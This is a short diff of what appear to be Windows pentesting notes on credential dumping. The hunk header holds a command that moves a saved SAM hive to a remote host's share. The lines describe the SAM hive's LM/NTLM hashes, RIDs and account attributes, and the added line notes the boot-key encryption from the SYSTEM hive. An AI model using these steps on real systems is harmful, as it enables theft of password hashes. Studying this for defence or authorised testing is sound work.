@@ -24,6 +24,7 @@ move sam.save \\<hoost ip>\SHARENAME
 		-> LM and NTLM password hashes, `lm_hash:nt_hash` in the values uner `SAM\Domains\Account\Users`
 		-> RIDs(relative identifiers) mapping users to SIDs
 		-> Acc attributes: disabled, locked, password-not-required, etc 
+		-> The keys are encrypted with a boot key from THE `SYSTEM` HIVE
 
 	- `C:\Windows\System32\config\SYSTEM`
 	- `C:\Windows\System32\config\SECURITY `
